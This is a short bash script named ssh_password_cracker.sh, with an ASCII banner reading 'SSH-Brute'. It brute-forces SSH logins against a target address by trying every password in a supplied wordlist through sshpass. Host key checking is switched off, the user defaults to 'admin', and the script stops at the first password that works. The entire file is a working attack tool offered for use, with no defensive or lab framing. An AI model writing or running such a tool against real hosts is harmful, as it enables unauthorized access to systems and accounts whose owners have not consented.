#!/bin/bash

#Title
title=$(cat <<'EOF'

  _________ _________ ___ ___          __________                __          
 /   _____//   _____//   |   \         \______   \_______ __ ___/  |_  ____  
 \_____  \ \_____  \/    ~    \  ______ |    |  _/\_  __ \  |  \   __\/ __ \ 
 /        \/        \    Y    / /_____/ |    |   \ |  | \/  |  /|  | \  ___/ 
/_______  /_______  /\___|_  /          |______  / |__|  |____/ |__|  \___  >
        \/        \/       \/                  \/                         \/ 
version 1.0, made by bananut
EOF
)

#Help string
help="example usage: ./ssh_password_cracker.sh user /path/to/wordlist.txt target_adress"

# Function to handle the interrupt signal (Ctrl+C)
cleanup() {
  echo "Script interrupted. Exiting..."
  exit 1
}

# Trap interrupt signal (Ctrl+C)
trap cleanup INT

# Get Arguments
user=$1
wordlist=$2
adress=$3

# Print the title
echo "$title"

# Check for help command
if [[ "$user" == "help" || "$user" == "-h" || "$user" == "--help" ]]; then
  echo -e  "$help"
  exit
fi

# Ping to see if the adress is up
if ping -q -c 2 -W 1 "$adress" > /dev/null; then
  echo "Your adress is up"
else
  echo "Your adress is down"
  echo "Exiting ..."
  exit
fi

# Check for the wordlist
if [[ -z "$wordlist" ]]; then
        echo "Wordlist not found"
        exit
fi

# Set user to admin if its empty
if [[ -z "$user" ]]; then
        user="admin"
fi

# Brute force password
for passwd in $(cat "$wordlist");
do
  echo "Loging in into adress:$adress with password:$passwd as user:$user"
  if sshpass -p "$passwd" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -l "$user" "$adress" "exit" 2>/dev/null; then
    echo "Success, Logged in using password:$passwd"
    exit
  else
    echo "Incorrect Password"
  fi
done

# End script if no password worked :(
echo "No password in wordlist matched"
